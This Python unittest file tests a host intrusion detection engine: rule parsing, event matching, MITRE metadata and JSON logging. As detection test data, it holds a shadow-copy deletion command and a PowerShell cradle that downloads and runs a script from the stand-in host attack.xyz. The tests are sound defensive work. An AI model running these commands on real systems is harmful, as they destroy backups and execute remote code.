"""
Unit tests for the Refactored HIDS Rule & Consolidated Logging Architecture.

Verifies:
1. hids.rules parsing
2. Malformed rule detection & line-numbered error reporting
3. Channel matching (case-insensitivity & multi-channel)
4. Event ID matching (single & multi-event ID)
5. "any" condition evaluation
6. "suspicious_process" condition evaluation
7. "suspicious_powershell" condition evaluation
8. Severity & MITRE ATT&CK metadata lookup by Rule ID
9. config.yaml loading & defaults
10. JSON Lines structured logging (logs/event.json with type='event', type='alert', type='correlation')
11. IST (+05:30) timezone accuracy on timestamp and processed_at
12. Thread-safe concurrent writing to event.json
"""

from datetime import datetime, timezone, timedelta
import json
from pathlib import Path
import tempfile
import threading
import unittest

from hids.hids import HIDSEngine, load_config
from hids.normalizer import NormalizedEvent
from hids.rule_engine import AllowlistEngine, RuleEngine, RuleMatch, check_event
from hids.rule_metadata import (
    RULE_METADATA_REGISTRY,
    RuleMetadata,
    get_rule_metadata,
)
from hids.rules_parser import Rule, RuleParser, DEFAULT_RULES_FILE
from hids.severity import Severity
from logger import (
    log_event_json,
    log_security_alert_json,
    log_correlated_alert_json,
    write_json_log,
    to_ist_iso,
    IST,
    console_event,
    console_alert,
    console_correlation,
)
from hids.correlator import CorrelatedAlert


class TestHIDSRulesArchitecture(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.temp_path = Path(self.temp_dir.name)

    def tearDown(self):
        self.temp_dir.cleanup()

    # -------------------------------------------------------------
    # 1. hids.rules Parsing
    # -------------------------------------------------------------
    def test_hids_rules_parsing_default_file(self):
        parser = RuleParser(rules_file=DEFAULT_RULES_FILE)
        rules = parser.parse()

        self.assertGreaterEqual(len(rules), 21, "Must parse at least 21 HIDS rules")

        rule_ids = {r.rule_id for r in rules}
        expected_ids = {
            "SEC-001", "PRV-001", "PRV-002", "PRV-003", "PROC-001",
            "SRV-001", "SRV-002", "MAL-001", "MAL-002", "MAL-003",
            "PSH-001", "LOG-001", "ACC-001", "ACC-002", "ACC-003",
            "ACC-004", "AUTH-001", "LOGON-001", "SCHD-001", "AUDIT-001", "FW-001",
        }
        for eid in expected_ids:
            self.assertIn(eid, rule_ids, f"Rule {eid} must be present in parsed rules")

        sec001 = next(r for r in rules if r.rule_id == "SEC-001")
        self.assertEqual(sec001.channels, ["Security"])
        self.assertEqual(sec001.event_ids, {4625})
        self.assertEqual(sec001.condition, "any")

        prv002 = next(r for r in rules if r.rule_id == "PRV-002")
        self.assertEqual(prv002.event_ids, {4728, 4732, 4756})

        psh001 = next(r for r in rules if r.rule_id == "PSH-001")
        self.assertEqual(set(psh001.channels), {"Microsoft-Windows-PowerShell/Operational", "Windows PowerShell"})
        self.assertEqual(psh001.event_ids, {4104, 4103, 400, 600})
        self.assertEqual(psh001.condition, "suspicious_powershell")

    def test_custom_rule_content_parsing(self):
        content = """
        # Custom rule test with comments
        alert -> TEST-001 -> Security,System -> 100,200 -> any
        alert -> TEST-002 -> Application -> 300 -> suspicious_process # trailing comment
        """
        parser = RuleParser(rules_content=content)
        rules = parser.parse()
        self.assertEqual(len(rules), 2)
        self.assertEqual(rules[0].rule_id, "TEST-001")
        self.assertEqual(rules[0].channels, ["Security", "System"])
        self.assertEqual(rules[0].event_ids, {100, 200})
        self.assertEqual(rules[1].rule_id, "TEST-002")
        self.assertEqual(rules[1].condition, "suspicious_process")

    # -------------------------------------------------------------
    # 2. Malformed Rule Detection
    # -------------------------------------------------------------
    def test_malformed_rule_detection(self):
        # Missing -> delimiter
        bad1 = "alert SEC-001 Security 4625 any"
        with self.assertRaises(ValueError) as ctx:
            RuleParser(rules_content=bad1).parse()
        self.assertIn("line 1", str(ctx.exception))
        self.assertIn("missing '->'", str(ctx.exception))

        # Too few fields
        bad2 = "alert -> SEC-001 -> Security -> 4625"
        with self.assertRaises(ValueError) as ctx:
            RuleParser(rules_content=bad2).parse()
        self.assertIn("expected 5 fields", str(ctx.exception))

        # Invalid action
        bad3 = "drop -> SEC-001 -> Security -> 4625 -> any"
        with self.assertRaises(ValueError) as ctx:
            RuleParser(rules_content=bad3).parse()
        self.assertIn("invalid rule action", str(ctx.exception))

        # Non-integer Event ID
        bad4 = "alert -> SEC-001 -> Security -> not_an_int -> any"
        with self.assertRaises(ValueError) as ctx:
            RuleParser(rules_content=bad4).parse()
        self.assertIn("invalid integer event ID", str(ctx.exception))

    # -------------------------------------------------------------
    # 3. Channel Matching
    # -------------------------------------------------------------
    def test_channel_matching(self):
        rule = Rule(rule_id="CH-001", channels=["Security"], event_ids={4625}, condition="any")
        engine = RuleEngine(rules=[rule])

        # Matching channel (case-insensitive)
        ev_sec = NormalizedEvent(event_id=4625, channel="security", user="test_user")
        matches = engine.evaluate(ev_sec)
        self.assertEqual(len(matches), 1)

        # Non-matching channel
        ev_sys = NormalizedEvent(event_id=4625, channel="System", user="test_user")
        matches_sys = engine.evaluate(ev_sys)
        self.assertEqual(len(matches_sys), 0)

    # -------------------------------------------------------------
    # 4. Event ID Matching
    # -------------------------------------------------------------
    def test_event_id_matching(self):
        rule = Rule(rule_id="EID-001", channels=["Security"], event_ids={4728, 4732, 4756}, condition="any")
        engine = RuleEngine(rules=[rule])

        for eid in (4728, 4732, 4756):
            ev = NormalizedEvent(event_id=eid, channel="Security", event_data={"TargetUserName": "Admins"})
            matches = engine.evaluate(ev)
            self.assertEqual(len(matches), 1, f"EventID {eid} should match")

        # Unrelated Event ID
        ev_other = NormalizedEvent(event_id=4624, channel="Security")
        self.assertEqual(len(engine.evaluate(ev_other)), 0)

    # -------------------------------------------------------------
    # 5. "any" Condition
    # -------------------------------------------------------------
    def test_any_condition_matching(self):
        rule = Rule(rule_id="SEC-001", channels=["Security"], event_ids={4625}, condition="any")
        engine = RuleEngine(rules=[rule])

        ev = NormalizedEvent(
            event_id=4625,
            channel="Security",
            user="bad_actor",
            event_data={"IpAddress": "10.0.0.1"},
        )
        matches = engine.evaluate(ev)
        self.assertEqual(len(matches), 1)
        self.assertEqual(matches[0].rule_id, "SEC-001")
        self.assertIn("bad_actor", matches[0].details)

    # -------------------------------------------------------------
    # 6. "suspicious_process" Condition
    # -------------------------------------------------------------
    def test_suspicious_process_condition(self):
        rule = Rule(rule_id="PROC-001", channels=["Security"], event_ids={4688}, condition="suspicious_process")
        engine = RuleEngine(rules=[rule])

        # Malicious process
        mal_ev = NormalizedEvent(
            event_id=4688,
            channel="Security",
            event_data={"CommandLine": "vssadmin.exe delete shadows /all /quiet"},
        )
        matches = engine.evaluate(mal_ev)
        self.assertEqual(len(matches), 1)
        self.assertIn("Ransomware shadow copy deletion", matches[0].details)

        # Benign process
        benign_ev = NormalizedEvent(
            event_id=4688,
            channel="Security",
            event_data={"CommandLine": "C:\\Windows\\System32\\notepad.exe file.txt"},
        )
        self.assertEqual(len(engine.evaluate(benign_ev)), 0)

    # -------------------------------------------------------------
    # 7. "suspicious_powershell" Condition
    # -------------------------------------------------------------
    def test_suspicious_powershell_condition(self):
        rule = Rule(
            rule_id="PSH-001",
            channels=["Microsoft-Windows-PowerShell/Operational"],
            event_ids={4104},
            condition="suspicious_powershell",
        )
        engine = RuleEngine(rules=[rule])

        # Malicious PowerShell
        mal_ps = NormalizedEvent(
            event_id=4104,
            channel="Microsoft-Windows-PowerShell/Operational",
            event_data={"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://attack.xyz/p.ps1')"},
        )
        matches = engine.evaluate(mal_ps)
        self.assertEqual(len(matches), 1)
        self.assertIn("DownloadString", matches[0].details)

        # Benign PowerShell
        benign_ps = NormalizedEvent(
            event_id=4104,
            channel="Microsoft-Windows-PowerShell/Operational",
            event_data={"ScriptBlockText": "Get-Service | Where-Object {$_.Status -eq 'Running'}"},
        )
        self.assertEqual(len(engine.evaluate(benign_ps)), 0)

    # -------------------------------------------------------------
    # 8. Severity & MITRE Metadata Lookup by Rule ID
    # -------------------------------------------------------------
    def test_metadata_lookup_by_rule_id(self):
        sec_meta = get_rule_metadata("SEC-001")
        self.assertEqual(sec_meta.rule_id, "SEC-001")
        self.assertEqual(sec_meta.name, "Failed User Logon")
        self.assertEqual(sec_meta.severity, Severity.LOW)
        self.assertIn("T1078", sec_meta.mitre_attack)

        mal_meta = get_rule_metadata("MAL-001")
        self.assertEqual(mal_meta.severity, Severity.CRITICAL)

        proc_meta = get_rule_metadata("PROC-001")
        self.assertEqual(proc_meta.severity, Severity.HIGH)

        # Custom / unknown rule fallback
        unk_meta = get_rule_metadata("UNKNOWN-999")
        self.assertEqual(unk_meta.rule_id, "UNKNOWN-999")
        self.assertEqual(unk_meta.severity, Severity.MEDIUM)

    # -------------------------------------------------------------
    # 9. config.yaml Loading
    # -------------------------------------------------------------
    def test_config_yaml_loading(self):
        config = load_config()
        self.assertIn("hids", config)
        hids = config["hids"]

        self.assertTrue(hids["enabled"])
        self.assertIn("Security", hids["channels"])
        self.assertIn("System", hids["channels"])
        self.assertIn("Microsoft-Windows-Windows Defender/Operational", hids["channels"])
        self.assertEqual(hids["polling_interval"], 2)
        self.assertEqual(hids["checkpoint"]["file"], "logs/checkpoints.json")
        self.assertTrue(hids["deduplication"]["enabled"])
        self.assertEqual(hids["logging"]["json_file"], "logs/event.json")
        self.assertNotIn("text_file", hids["logging"])

    # -------------------------------------------------------------
    # 10. JSON Logging Structure (event.json)
    # -------------------------------------------------------------
    def test_json_logging_structure(self):
        test_json_file = self.temp_path / "test_event.json"

        event = NormalizedEvent(
            event_id=4688,
            channel="Security",
            user="victim_admin",
            computer="WORKSTATION-01",
            record_id=9876,
            provider="Microsoft-Windows-Security-Auditing",
            message="Process created",
        )

        # 1. Log ordinary event (type='event')
        ev_rec = log_event_json(event, json_path=test_json_file)
        self.assertEqual(ev_rec["type"], "event")
        self.assertEqual(ev_rec["event_id"], 4688)
        self.assertEqual(ev_rec["record_id"], 9876)
        self.assertIn("+05:30", ev_rec["timestamp"])
        self.assertIn("+05:30", ev_rec["processed_at"])

        # 2. Log security alert (type='alert')
        match = RuleMatch(
            rule_id="PROC-001",
            rule_name="Suspicious Process Execution",
            severity=Severity.HIGH,
            description="Process creation detection",
            mitre_attack="T1059",
            event=event,
            details="Detected Ransomware shadow copy deletion",
        )
        alert_rec = log_security_alert_json(match, json_path=test_json_file)
        self.assertEqual(alert_rec["type"], "alert")
        self.assertEqual(alert_rec["severity"], "HIGH")
        self.assertEqual(alert_rec["rule_id"], "PROC-001")
        self.assertEqual(alert_rec["mitre_attack"], ["T1059"])
        self.assertEqual(alert_rec["details"], "Detected Ransomware shadow copy deletion")
        self.assertIn("+05:30", alert_rec["timestamp"])

        # 3. Log Correlated Alert (type='correlation')
        corr_alert = CorrelatedAlert(
            correlation_id="CORR-001",
            name="Brute-Force Authentication Succeeded",
            severity=Severity.CRITICAL,
            description="Correlation alert",
            mitre_attack="T1110.001, T1078",
            details="3 failed logons followed by success",
            events=[event],
        )
        corr_rec = log_correlated_alert_json(corr_alert, json_path=test_json_file)
        self.assertEqual(corr_rec["type"], "correlation")
        self.assertEqual(corr_rec["severity"], "CRITICAL")
        self.assertEqual(corr_rec["correlation_id"], "CORR-001")
        self.assertIn("+05:30", corr_rec["timestamp"])

        # Verify reading all 3 records
        with open(test_json_file, "r", encoding="utf-8") as f:
            records = [json.loads(l) for l in f.readlines()]

        self.assertEqual(len(records), 3)
        self.assertEqual(records[0]["type"], "event")
        self.assertEqual(records[1]["type"], "alert")
        self.assertEqual(records[2]["type"], "correlation")

    # -------------------------------------------------------------
    # 11. Accurate IST Timestamps (+05:30)
    # -------------------------------------------------------------
    def test_accurate_ist_timestamps(self):
        # UTC datetime converted to IST (+05:30)
        utc_dt = datetime(2026, 9, 1, 6, 40, 2, 643250, tzinfo=timezone.utc)
        ist_str = to_ist_iso(utc_dt)
        self.assertTrue(ist_str.endswith("+05:30"))
        self.assertEqual(ist_str, "2026-09-01T12:10:02.643250+05:30")

        # Parsing ISO string with Z
        iso_z = "2026-09-01T06:40:02.643250Z"
        ist_converted = to_ist_iso(iso_z)
        self.assertEqual(ist_converted, "2026-09-01T12:10:02.643250+05:30")

    # -------------------------------------------------------------
    # 12. Thread-Safe Concurrent Writes
    # -------------------------------------------------------------
    def test_thread_safe_concurrent_writes(self):
        test_json_file = self.temp_path / "concurrent_event.json"
        num_threads = 10
        writes_per_thread = 20

        def worker(thread_idx):
            for i in range(writes_per_thread):
                write_json_log(
                    {"thread": thread_idx, "index": i, "timestamp": to_ist_iso(None)},
                    json_path=test_json_file,
                )

        threads = [threading.Thread(target=worker, args=(t,)) for t in range(num_threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        with open(test_json_file, "r", encoding="utf-8") as f:
            lines = f.readlines()

        self.assertEqual(len(lines), num_threads * writes_per_thread)
        for line in lines:
            parsed = json.loads(line)
            self.assertIn("thread", parsed)


if __name__ == "__main__":
    unittest.main()
